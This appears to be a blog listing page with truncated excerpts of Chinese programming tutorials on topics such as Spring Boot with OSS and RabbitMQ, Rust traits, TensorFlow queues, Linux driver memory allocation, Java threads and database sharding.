windows # 函数 HANDLE CreateFileMapping( HANDLE hFile, // 文件句柄，填写 INVALID_HANDLE_VALUE LPSECURITY_ATTRIBUTES lpFileMappingAttributes, // 安全描述符，填写 NULL DWORD flProtect, // 映射对象保护属性 DWORD dwMaximumSizeHigh, // 文件映射的最大长度的高32位 DWORD dwMaximumSizeLow, // 文件映射的最大长度的低32位 LPCTSTR lpName // 文件映射对象名称 ); linux # 函数 void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset); # 参数说明 ## start：映射区的开始地址 ## length：映射区的长度 ## prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过or运算合理地组合在一起 ## flags：指定映射对象的类型，映射选项和映射页是否可以共享。 ## fd：有效的文件描述词。如果MAP_ANONYMOUS被设定，为了兼容问题，其值应为-1 ## offset：被映射对象内容的起点。 3）映射文件到进程的虚拟地址空间。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ccb02aa2454f2c9459492e75d509dfbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4ccad726b47754b357c06b39c7754c8/" rel="bookmark">
			SpringBoot整合OSS文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、注册阿里云账号并开通OSS服务 1、登录阿里云账号
2、创建一个bucket
3、创建子用户
对自用户分配权限，打开操作OSS的全部权限（也可根据业务需求进行更改）
4、配置上传跨域规则
任何来源: *允许方法: POST任何请求头Headers: * 二、文件上传方式 1、服务器直传方式 每个OSS的用户都会用到上传服务。Web端常见的上传方法是用户在浏览器或App端上传文件到应用服务器，应用服务器再把文件上传到OSS
和数据直传到OSS相比，以上方法有三个缺点：
上传慢：用户数据需先上传到到应用服务器，之后再上传到OSS。网络传输时间比直传到OSS多一倍。如果用于数据不通过应用服务器中转，而是直传到OSS，速度将大大提升。而且OSS采用BGP带宽，能保证各地各运营商之间的传输速度扩展性差：如果后续用户多了，应用服务器会成为瓶颈费用高：需要准备多台应用服务器。由于OSS上传流量是免费的，如果数据直传到OSS，不通过应用服务器，那么将能省下几台应用服务器 2、服务端签名后前端直传 Web前端服务端请求签名，然后前端(Vue)直接上传，不会对服务端产生压力，而且安全可靠。
相关资料：服务端签名直传并设置上传回调概述
Java连接实例：Java实践OSS
上传回调流程
Web前端请求应用服务器，获取上传所需参数（如OSS的accessKeyId、policy、callback等参数）应用服务器返回相关参数Web前端直接向OSS服务发起上传文件请求等上传完成后OSS服务会回调应用服务器的回调接口应用服务器返回响应给OSS服务OSS服务将应用服务器回调接口的内容返回给Web前端 3、SpringBoot整合OSS实现文件上传 1、在pom.xml中添加相关依赖
&lt;dependency&gt;&lt;groupId&gt;com.aliyun.oss&lt;/groupId&gt;&lt;artifactId&gt;aliyun-sdk-oss&lt;/artifactId&gt;&lt;version&gt;3.10.2&lt;/version&gt;&lt;/dependency&gt; 2、修改SpringBoot配置文件
#操作oss需要的一些参数aliyun:oss:accessKeyId: xxx # 阿里云的accessKeyIdaccessKeySecret: xxx # accessKey 密码endPoint: xxx # Endpoint:在阿里云oss控制台查看自己使用的endpoint，eg: oss-cn-shanghai.aliyuncs.com bucketName: xxx # bucket 名称policy:expire: 300 # 签名有效期(S)maxSize: 10 # 上传文件大小(M)callback: http://localhost:8080/aliyun/oss/callback # 文件上传成功后的回调地址dir:prefix: xxx/images/ # 上传文件夹路径前缀 3、添加OSS的相关Java配置
用于配置OSS的连接客户端的OSSClient
/*** TODO 用于配置OSS的连接客户端OSSClient** @author ss_419* @version 1.0* @date 2023/5/28 19:04*/@Configuration@Componentpublic class OssConfig {@Value("${aliyun.oss.endpoint}")private String ALIYUN_OSS_ENDPOINT;@Value("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4ccad726b47754b357c06b39c7754c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5283446946026f260b53303d8219cdaf/" rel="bookmark">
			rust的demo
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		特征使用示例1：
use std::ops::Add; //直接输出Point的值 #[derive(Debug)] struct Point&lt;T: Add&lt;Output = T&gt;&gt; { x: T, y: T, } //为Point实现Add trait impl&lt;T:Add&lt;T,Output=T&gt;&gt; Add for Point&lt;T&gt;{ type Output=Point&lt;T&gt;; fn add(self,p:Point&lt;T&gt;)-&gt;Point&lt;T&gt;{ Point { x:self.x+p.x, y:self.y+p.y } } } fn add&lt;T:Add&lt;T,Output=T&gt;&gt;(a:T,b:T)-&gt;T{ a+b } fn main(){ let p1=Point { x:1, y:2 }; let p2=Point { x:3, y:4 }; // let p3=p1+p2; // println!("p3.x={},p3.y={}",p3.x,p3.y); println!("p3={:?}",add(p1,p2)); } 特征重写内置的Display
//实际生产中需要自定义输出 use std::fmt; use std::fmt::{Display}; #[derive(Debug,PartialEq)] enum FileState{ Open, Closed, } #[derive(Debug)] struct File{ name:String, data:Vec&lt;u8&gt;, state:FileState, } impl Display for FileState{ fn fmt(&amp;self,f:&amp;mut fmt::Formatter)-&gt;fmt::Result{ //模式匹配 match *self{ FileState::Open=&gt;write!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5283446946026f260b53303d8219cdaf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d4415b46efeb2e842855956cac8a787/" rel="bookmark">
			Winform通过Databinding以及InotifyPropertychanged实现绑定（仿MVVM）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.创建一个ViewModel类
在这里插 internal class VMBase : INotifyPropertyChanged { public event PropertyChangedEventHandler PropertyChanged; protected virtual void OnPropertyChanged([CallerMemberName]string propertyName=null) { PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName)); } }入代码片 2.创建一个Mvm类继承VMBase
internal class MVM:VMBase { private string firstName="Fn"; public string FirstName { get { return firstName; } set { firstName = value; OnPropertyChanged(); OnPropertyChanged(); } } private string lastName="Ln"; public string LastName { get { return lastName; } set { lastName = value; OnPropertyChanged(); OnPropertyChanged(); } } private string fullName="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d4415b46efeb2e842855956cac8a787/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da804346b38b0d027416af3a50950f6c/" rel="bookmark">
			springboot与rabbitmq的整合【演示5种基本交换机】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：
👏作者简介：我是笑霸final，一名热爱技术的在校学生。
📝个人主页：个人主页1 || 笑霸final的主页2
📕系列专栏：后端专栏
📧如果文章知识点有错误的地方，请指正！和大家一起学习，一起进步👀
🔥如果感觉博主的文章还不错的话，👍点赞👍 + 👀关注👀 + 🤏收藏🤏
话不多说 直接开干
目录 一 导入maven坐标与配置二、直连交换机direct exchange2.1配置类QueueConfig2.2消息提供者2.2消息消费者2.3测试类 三、默认交换机default exchange3.1配置类和消息提供者3.2消息消费者3.3测试结果 四、扇型交换机fanout exchange4.1配置类4.2消息提供者4.3消息消费者4.4测试类 五、主题交换机topic exchanges5.1配置类5.2消息提供者5.3消息消费者5.4测试 六、头交换机 headers exchange6.1配置类6.2创建消息提供者6.3消息消费者6、4测试结果 一 导入maven坐标与配置 &lt;!--rabbitmq--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt; &lt;/dependency&gt; 基础配置文件
spring: rabbitmq: username: 你的用户名 password: 你的密码 host: rabbitmq安装的主机的 ip地址 port: 5672 #端口号 二、直连交换机direct exchange 直连型交换机（direct exchange）是根据消息携带的路由键（routing key）将消息投递给对应队列的。
将一个队列 绑定到 某个交换机上，同时赋予该绑定一个路由键（routing key）当一个携带着路由键为routingKey01的消息被发送给直连交换机时，交换机会把它路由给绑定值同样为routingKey01的队列。 直连交换机经常用来循环分发任务给多个工作者（workers）。当这样做的时候，我们需要明白一点，在AMQP 0-9-1中，消息的负载均衡是发生在消费者（consumer）之间的，而不是队列（queue）之间。
2.1配置类QueueConfig @Configuration public class QueueConfig { /** * 创建一个队列 队列名为direct1 * */ @Bean public Queue queue01(){ return new Queue("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da804346b38b0d027416af3a50950f6c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/174daa3d8c3f49b81cf2b12c33f9f3b5/" rel="bookmark">
			NI异常：Internal Software Error occurred in MIG software. Please contact National Instruments Support.
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Status Code: -229771
NI异常：Internal Software Error occurred in MIG software. Please contact National Instruments Support.
从5.0版本开始，MAX中包含一个新的用于重置配置数据的实用程序。此实用程序允许您自动将MAX数据库恢复为默认设置。如果安装了MAX 5.0或更高版本，请通过完成以下步骤来使用此选项。
在MAX中使用重置配置数据实用程序的步骤：
1.在MAX中，选择工具»重置配置数据。 2.确保存所有已开启进程中的未保存进度已经得到保存。出现以下对话框提示时，选择“ 是”以重新启动计算机。
3.系统重启后，MAX数据库将被设置为默认值。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc12d9c4923707e8c8729430f3a8e37a/" rel="bookmark">
			Tensorflow入门（2）——深度学习框架Tesnsflow &amp; 线程&#43;队列&#43;IO操作 &amp; 文件读取案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、二、Tesnsflow入门 &amp; 环境配置 &amp; 认识Tensorflow三、线程与队列与IO操作1.队列实例：完成一个出队列、+1、入队列操作(同步操作) 2.队列管理器 创建线程3.线程协调器 管理线程案例：通过队列管理器来实现变量加1，入队，主线程出队列的操作，观察效果？(异步操作) 4.文件读取流程1.文件读取API-文件队列构造2.文件读取API-文件阅读器3.文件读取API-文件内容解码器4.开启线程操作5.管道读端批处理案例：CSV文件读取 5.图片文件 一、二、Tesnsflow入门 &amp; 环境配置 &amp; 认识Tensorflow Tensorflow入门（1）——深度学习框架Tesnsflow入门 &amp; 环境配置 &amp; 认识Tensorflow
三、线程与队列与IO操作 1.队列 在训练样本的时候，希望读入的训练样本时有序的
• tf.FIFOQueue 先进先出队列，按顺序出队列
• tf.RandomShuffleQueue 随机出队列
FIFOQueue(capacity, dtypes, name=‘fifo_queue’)
创建一个以先进先出的顺序对元素进行排队的队列
capacity：整数。可能存储在此队列中的元素数量的上限dtypes：DType对象列表。长度dtypes必须等于每个队列元素中的张量数,dtype的类型形状，决定了后面进队列元素形状method:
dequeue(name=None)：出队列
enqueue(vals, name=None)：入队列
enqueue_many(vals, name=None):vals列表或者元组：同时把许多数据放入队列，返回一个进队列操作
size(name=None)：队列的size 实例：完成一个出队列、+1、入队列操作(同步操作) import tensorflow as tf # tensorflow当中，运行操作有依赖性 # 1、首先定义队列 # 2、定义一些读数据，取数据的过程 ， 取数据，+1 ，入队列 # 1\定义队列 Q = tf.FIFOQueue(3, tf.float32) # 放入数据 enq_many = Q.enqueue_many([[0.1,0.2,0.3],])# 列表 # 2\处理数据，取数据，+1，入队列 out_q = Q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc12d9c4923707e8c8729430f3a8e37a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/938a2b9dc0f9ee5dd1bbf539be48d71a/" rel="bookmark">
			10-Spring Boot配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.配置文件作用
2.配置文件的格式
为配置文件安装提示插件
2.1. .properties（旧版，默认的）
2.1.1.基本语法
PS:配置文件中使用"#"来添加注释信息，2种添加方式：
2.1.2.缺点分析
2.2. .yml（新版）
2.2.1.基本语法
2.2.2.使用进阶
①配置不同数据类型及null
②配置对象
@ConfigurationProperties来读取配置中的对象：
③配置集合
集合的读取和对象一样，也是使用 @ConfigurationProperties 来读取的。
2.3.properties VS yml
2.4.查看更多系统配置项
3.读取配置文件
3.1.读取properties配置文件：
3.2.读取yml配置文件：
PS：注意：value值加单双引号（yml）
4.扩展：Spring Boot读取配置文件的5种方法
4.1.@Value注解(仅限单个信息，集合和对象除外)
4.2.@ConfigurationProperties注解
4.3.Environment（Spring提供的对象，注入后就能用）
4.4.@PropertySource注解
中文乱码
4.5.原生方式读取（不推荐麻烦）
5.设置不同平台的配置文件
5.1.创建不同平台的配置文件
5.2.在主配置文件中配置项目的运行平台
1.配置文件作用 整个项目中所有重要的数据（会随环境变更的配置信息）都是在配置文件中配置的，如：
数据库的连接信息（包含用户名和密码的设置）。项目的启动端口。第三方系统的调用密钥等信息。用于发现定位问题的普通日志和异常日志等。 配置文件中存储的内容有2种：
①系统级别的信息；
②程序员自定义的信息（特殊业务如保存第三方密钥）。
如果没有配置信息，那么Spring Boot项目就不能连接和操作数据库，甚至不能保存可以用于排查问题的关键日志，所以配置信息的作用是非常重要的。
如果没有配置文件，配置信息若写死在源代码中，会存在的问题：
配置项可能写在多个源代码的文件中，会有遗漏的风险。而配置文件让所有的配置信息都统一写在一起，无论查看还是修改都一目了然。
文件保存地址：本地（大概率是Windows系统）和生产服务器（99.9%为Linux系统）二者的目录就完全不一样。MySQL连接的配置文件，本地和远程是不一样的。
Spring Boot一个项目里可以设置2套以上的环境，如：
有一个配置文件专门写在开发环境，还为生产环境再去建一个配置文件。
（这样就不用像之前：上线时配置文件要改为生产环境的配置文件，本地运行时又改为开发环境的配置文件）
只需在进行环境变更的时候，指定一下Spring Boot要用哪个环境的配置文件就行。
（两个文件不存在把哪个注释掉，不用像之前一样添加注释改来改去）
若把所有的配置信息写死在源代码中，是不可改的；而写在配置文件中，是可改的。
.java源代码(可改)编译后生成的target文件夹里是.class字节码文件(改不了)；
而配置文件(可改)编译后生成的target文件夹里还是配置文件(可改)。
项目最后运行格式是jar包的格式，jar包里放的是target里的文件，配置文件可以直接从jar包中拉出来，做完修改后再放回压缩包里覆盖原先内容，利于修改。
若是在源代码中写的内容，只能由程序员来进行修改；而配置文件中的内容不仅程序员可改，运维工程师（可改配置文件，懂Linux指令，攻防安全的手段，不会改java源代码）也可修改。在项目上线时，运维决定把服务放在哪台机器上，决定连哪个数据库，他就需要能直接去改配置文件。
2.配置文件的格式 Spring Boot配置文件主要分为以下2种格式(文件的后缀代表文件的格式，配置文件也是如此)：
properties类型的配置文件属于老版本一代产品，也是创建Spring Boot项目时默认的文件格式；而yml属于新版二代产品，若程序员会用且要用，直接创建即可。配置文件的名称是固定的认死的，只能是"application"，如果改成其它的名称，配置文件的内容将不再生效。（约定大于配置）配置文件里尽量不要出现中文，会有乱码。yml中可以用中文，因为创建时默认文件格式是UTF-8（支持简单和复杂中文）；properties中千万不要用中文，第二次打开会出现中文变乱码情况，因为创建时文件格式默认是GBK（在未进行系统配置之前）。解决：File -&gt; New Projects Settings -&gt; Settings for New projects.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/938a2b9dc0f9ee5dd1bbf539be48d71a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac2c0620f4bf2f44c0675f833219a67b/" rel="bookmark">
			统信UOS上自带远程连接工具使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：统信UOS上自带远程连接工具使用方法
hello，大家好啊，今天给大家带来一篇关于在统信UOS上使用自带远程连接的文章，在公网环境及内网环境中，我们或多或少会使用到远程访问的工具，今天就给大家演示一下统信桌面系统自带这个远程连接工具怎么使用。
1、主机一使用1050系统
test111@first:~/Desktop$ uname -a Linux first 4.19.0-arm64-desktop #5410 SMP Thu Jun 1 19:48:23 CST 2023 aarch64 GNU/Linux test111@first:~/Desktop$ cat /etc/os-version [Version] SystemName=UnionTech OS Desktop SystemName[zh_CN]=统信桌面操作系统 ProductType=Desktop ProductType[zh_CN]=桌面 EditionName=Professional EditionName[zh_CN]=专业版 MajorVersion=20 MinorVersion=1050 OsBuild=11014.110 test111@first:~/Desktop$ 2、主机二使用1060系统
uos@uos-PC:~/Desktop$ uname -a Linux uos-PC 4.19.0-arm64-desktop #6030 SMP Tue Jun 27 15:28:10 CST 2023 aarch64 GNU/Linux uos@uos-PC:~/Desktop$ cat /etc/os-version [Version] SystemName=UOS Desktop SystemName[zh_CN]=统信桌面操作系统 ProductType=Desktop ProductType[zh_CN]=桌面 EditionName=Professional EditionName[zh_CN]=专业版 MajorVersion=20 MinorVersion=1060 OsBuild=11014.100.100 uos@uos-PC:~/Desktop$ 3、在主机一、主机二启动器搜索远程协助
4、同意用户许可协议
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac2c0620f4bf2f44c0675f833219a67b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/074a92f3444ab95e1aecb6b46781056d/" rel="bookmark">
			PS快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		01、CtrI+N 新建画布
02、Ctrl+O 打开文件
03、Ctrl+ Shift+N 新建图层
04、抓手工具:空格键+拖动鼠标左键
05、Alt+ Delete 填充前景色
06、Ctrl+ Delete 填充背景色
07、Ctrl+R 标尺
08、Ctrl+ ; 显示/隐藏参考线
09、CtrI+’ 显示/隐藏网格
10、Ctrl+ D 取消选区
11、Ctrl+Z 撤销一步
12、Ctrl+ Alt+Z 撤销多步
13、 Ctrl+ +/- 放大/缩小画布
14、Ctrl+T 自由变换
15、Ctrl+ 鼠标左键选中多个图层
16、Ctrl+E 合并图层
17、合并图层必须选中两个或两个以上图层
18、绘制正方形:矩形工具按住Shift键
19、绘制圆形:椭圆工具按住Shift键
20、Ctrl+Shift+I 反选
21、Ctrl+Shift+U 去色
22、Ctrl+J 将选区内的像索建立成新的图层
23、Ctrl+L 打开色阶对话框
24、Ctrl+M 打开曲线对话框
25、复制图层:按住Alt并拖动要复制的图层
26、Ctrl+ 单击缩略图;创建选区
27、Ctrl+ 回车 把路径转换为选区
28、Ctrl+ Alt+G 剪贴蒙版
29、将前、背景色设为默认(前黑后白) : D
30、 前背景色互换: X
31、ctrl+鼠标左键点击图层缩略图 调图层选区
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d682be2c8a118b42450e8dd5fe318293/" rel="bookmark">
			Linux驱动进阶(四)——内外存访问
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言内存分配kmalloc函数vmalloc()函数后备高速缓存 页面分配内存分配物理地址和虚拟地址之间的转换 设备I/O端口的访问Linux I/O端口读写函数I/O内存读写使用I/O端口 小结 前言 驱动程序加载成功的一个关键因素，就是内核能够为驱动程序分配足够的内存空间。这些控件一部分用于驱动程序必要的数据结构，另一部分用于数据交换。同时，内核也应该具有访问外部设备端口的能力。一般来说，外部设备被连接到内存空间或者I/O空间中。本章将对内外存设备的访问进行详细的介绍。
内存分配 本节主要介绍内存分配的一些函数，包括kmalloc()函数和vmalloc()函数等。在介绍完这两个重要的函数之后，将重点讲解后备高速缓存的内容，这些知识对于驱动开发来说非常重要，需要引起注意。
kmalloc函数 在C语言中，经常会遇到malloc()和free()这两个函数“冤家”。malloc()函数用来进行内存分配，free()函数用来释放内存。kmalloc()函数类似于malloc()函数，不同的是kmalloc()函数用于内核态的内存分配。kmalloc()函数是一个功能强大的函数，如果内存充足，这个函数将运行的非常快。
kmalloc()函数在物理内存中为程序分配一个连续的存储空间。这个存储空间的数据不会被清零，也就是保存内存中原有的数据，在使用的时候需要引起注意。kmalloc()函数运行很快。可以传递标志给它，不允许其在分配内存时阻塞。kmalloc()函数原型如下：
static inline void *kmalloc(size_t size, gfp_t flags) kmalloc()函数的第一个参数是size，表示分配内存的大小。第2个参数是分配标志，可以通过这个标志控制kmalloc()函数的多种分配方式。和其他函数不同，kmalloc()函数的这两个参数非常重要，下面将对这两个参数详细的解释。
1.size参数
size参数涉及内存管理的问题，内存管理是Linux子系统中非常重要的一部分。Linux的内存管理方式限定了内存只能按照页面的大小进行内存分配。通常，页面大小为4K。如果使用kmalloc()函数为某个驱动程序分配4字节的内存空间，则Linux会返回一个页面4K的内存空间，这显然是一种内存浪费。
因为空间浪费的原因，kmalloc()函数与用户空间malloc()函数的实现完全不同。malloc()函数在堆中分配内存空间，分配的空间大小非常灵活，而kmalloc()函数分配内存空间的方法比较特殊，下面对这种方法进行简要的解释。
Linux内核对kmalloc()函数的处理方式是，先分配一系列不同大小的内存池，每个池中的内存大小是固定的。当分配内存时，将包含足够大的内存池中的内存传递给kmalloc()函数。在分配内存时，Linux内核只能分配预定义、固定大小的字节数。如果申请的内存大小不是2的整数倍，则会多申请一些内存，将大于申请内存的内存区块返回给请求者。
Linux内核为kmalloc()函数提供了大小为32字节、64字节、128字节、256字节、512字节、1024字节、2048字节、4096字节、8KB、16KB、32KB、64KB和128KB的内存池。所以程序员应该注意，kmalloc()函数最小能够分配32字节的内存，如果请求的内存小于32字节，那么也会返回32字节。kmalloc()函数能够分配的内存块的大小，也存在一个上限。为了代码的可移植性，这个上限一般是128KB。如果希望分配更多的内存，最好使用其他的内存分配方法。
2.flags参数
flags参数能够以多种方式控制kmalloc()函数的行为。最常用的申请内存的参数是GFP_KERNEL。使用这个参数运行调用它的进程在内存较少时进入睡眠，当内存充足时再分配页面。因此，使用GFP_KERNEL标志可能会引起阻塞，对于不允许阻塞的应用，应该使用其他的申请内存标志。在进程睡眠时，内核子系统会将缓冲区的内容写入磁盘，从而为睡眠的进程留出更多的空间。
在中断处理程序、等待队列等函数中不能使用GFP_KERNEL标志，因为这个标志可能会引起调用者的睡眠。当睡眠之后再唤醒，很多程序会出现错误。这种情况下可以使用GFP_ATOMIC标志，表示原子性的分配内存，也就是在分配内存的过程中不允许睡眠。为什么GFP_ATOMIC标志不会引起睡眠呢？这是因为内核为这种分配方式预留了一些内存空间，这些内存空间只有在kmalloc()函数传递标志为GFP_ATOMIC时，才会使用。在大多数情况下，GFP_ATOMIC标志的分配方式会成功，并即时返回。
除了GFP_KERNEL和GFP_ATOMIC标志外，还会有一些其他的标志，但其他的标志并不常用。这些标志的意义和使用方法如下表。
vmalloc()函数 vmalloc()函数用来分配虚拟地址连续但是物理地址不连续的内存。这就是说，用vmalloc()函数分配的页在虚拟地址空间中是连续的，而在物理地址空间中是不连续的。这是因为如果需要分配200M的内存空间，而实际的物理内存中现在不存在一块连续的200M内存空间，但是内存有大量的内存碎片，其容量大于200M，那么就可以使用vmalloc()函数将不连续的物理地址空间映射层连续的虚拟地址空间。
从执行效率上来讲，vmalloc()函数的运行开销远远大于__get_free_pages()函数。因为vmalloc()函数会建立新的页表，将不连续的物理内存映射成连续的虚拟内存，所以开销比较大。另外，由于新页表的建立，vmalloc()函数也更浪费CPU时间，而且需要更多的内存来存放页表。一般来说，vmalloc()函数用来申请大量的内存，对于少量的内存，最好使用__get_free_pages()函数来申请。
1.vmalloc()函数申请和释放
vmalloc()函数定义在mm\vmalloc.c文件中，该函数的原型如下：
void *vmalloc(unsigned long size) vmalloc()函数接收一个参数，size是分配连续内存的大小。如果函数执行成功，则返回虚拟地址连续的一块内存区域。为了释放内存，Linux内核也提供了一个释放由vmalloc()函数分配的内存，这个函数是vfree()函数，其代码如下：
void vfree(const void *addr) 2.vmalloc()函数举例
vmalloc()函数在功能上与kmalloc()函数不同，但在使用上基本相同。首先使用vmalloc()函数分配一个内存空间，并返回一个虚拟地址。内存分配是一项要求严格的任务，无论什么时候，都应该对返回值进行检测。当分配内存后，可以使用copy_from_user()对内存进行访问。也可以将返回的内存空间转换为一个结构体，像下面代码的12~15行一样使用vmalloc()分配的内存空间。在不需要使用内存时，可以使用20行的vfree()函数释放内存。在驱动程序中，使用vmalloc()函数的一个实例如xxx()函数所示：
static int xxx(...) { ... /*省略代码*/ cpuid_entires - vmalloc(sizeof(struct kvm_cpuid_entry) * cpuid-&gt;nent ); if(!cpuid_entries) goto out; if(copy_from_user(cpuid_entries, entries, cpuid-&gt;nent * sizeof(struct kvm_cpuid_entry))) goto out_free; for(i=0; i&lt; cpuid-&gt;nent; i++){ vcpu-&gt;arch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d682be2c8a118b42450e8dd5fe318293/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ed512a19be3a60d41189a15291b4c2c/" rel="bookmark">
			3-线程的3种创建方式7种写法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.方式一：继承Thread（2种写法）
写法①（常规）：
a.使用jconsole观察线程
b.启动线程——start方法
PS：（常见面试题）start 方法与 run 方法的区别：
写法②（简化）：匿名方式创建子对象
2.方式二：实现Runnable接口（3种写法）
写法③（常规）：
写法④（变种）：匿名Runnable方式（匿名内部类）
写法⑤（变种）：使用Lambda匿名Runable方式（更简单）
3.方式三：实现Callable接口（带返回值可为任意类型）（2种写法）
写法⑥（常规）：Callable + FutureTask(一个容器，用来接收线程执行的返回值)
写法⑦（简单）：匿名Callable
1.方式一：继承Thread（2种写法） 写法①（常规）： /** * 继承 Thread 创建线程 */ public class ThreadDemo3 { public static void main(String[] args) { //获得当前的线程 Thread mainThread = Thread.currentThread(); System.out.println("主线程的名称：" + mainThread.getName()); //创建线程 Thread thread = new MyThread(); //开启线程 thread.start(); } } class MyThread extends Thread { @Override //需要重写run方法 public void run() { //具体的业务执行代码 Thread thread = Thread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ed512a19be3a60d41189a15291b4c2c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3303b188eb5ad7759effc1a17d285ebc/" rel="bookmark">
			数据库的分片策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据库的分片策略 1、范围分片2、hash 取模分片3、一致性hash 分片 1.分片策略 数据库的分片策略是指将数据库中的数据按照一定的规则和方式进行分割（分片）存储在不同的物理节点或服务器上的策略。分片策略旨在实现水平扩展，提高数据库的性能和可扩展性。以下是几种常见的数据库分片策略：
基于范围的分片： 数据按照指定的范围进行分片，例如根据某一列的值范围将数据划分到不同的分片中。例如，按照用户ID的范围将用户数据分布到不同的分片中，例如ID小于10000的用户存储在分片1，ID在10000到20000之间的用户存储在分片2，以此类推。基于哈希的分片： 数据按照哈希算法进行分片，通过对某个列或一组列的哈希计算，将数据映射到不同的分片中。这种方式可以使数据在分片中均匀分布，避免热点数据的产生。例如，对用户ID进行哈希计算，将哈希值范围映射到不同的分片中。基于列表的分片： 数据按照预定义的列表进行分片，将符合列表中条件的数据存储在相应的分片中。例如，根据地理位置将用户数据分片，将属于不同地理区域的用户数据分别存储在对应的分片中。基于时间的分片： 数据按照时间进行分片，将不同时间段的数据存储在不同的分片中。例如，按照月份或年份将日志数据进行分片存储。混合分片策略： 组合使用多种分片策略，根据具体的业务需求和数据特点，采用多种分片方式。例如，先按照哈希方式将数据分片，再在每个分片中按照范围进行进一步的分片。 选择适当的分片策略需要综合考虑业务需求、数据特点、性能要求和可扩展性等因素。不同的分片策略适用于不同的场景，因此需要根据实际情况进行评估和选择。同时，分片策略的设计还需考虑数据迁移、负载均衡、故障恢复和数据一致性等问题，确保分片的有效管理和操作。
2.分片的使用场景 处理大规模数据： 数据量的快速增长是现代应用的常见情况。当数据量达到单个服务器的容量限制时，分片可以帮助应用处理大规模的数据，并将数据分布在多个节点上，充分利用集群的资源。提高读写性能： 分片可以将负载分散到多个节点上，从而提高数据库的读写性能。每个分片独立处理一部分数据，减轻了单个节点的负担，并允许并行处理查询和事务。增加可扩展性： 分片允许根据需求扩展数据库的容量和吞吐量。当数据量增加时，可以简单地增加更多的分片节点，而不是升级单个节点的硬件或软件。减少单点故障： 通过将数据分布在多个节点上，分片可以减少单个节点故障对整个系统的影响。如果一个节点发生故障，其他节点仍然可用，从而保证了系统的可用性和容错性。提供地理位置灵活性： 分片使得数据可以根据地理位置进行存储。这可以帮助应用满足数据存储的合规性要求，并降低数据访问的延迟。 以帮助应用满足数据存储的合规性要求，并降低数据访问的延迟。
尽管分片提供了许多优势，但也需要考虑一些挑战和复杂性，如数据迁移、跨分片事务处理、查询跨分片的支持等。因此，在实施分片之前，需要仔细评估和规划，确保正确选择适合应用需求的分片策略，并考虑好分片带来的额外开销和复杂性。
3.实现分片 开启分片（Sharding）涉及多个方面，包括数据库架构设计、部署配置和应用程序的更改。下面是一般情况下开启分片的步骤：
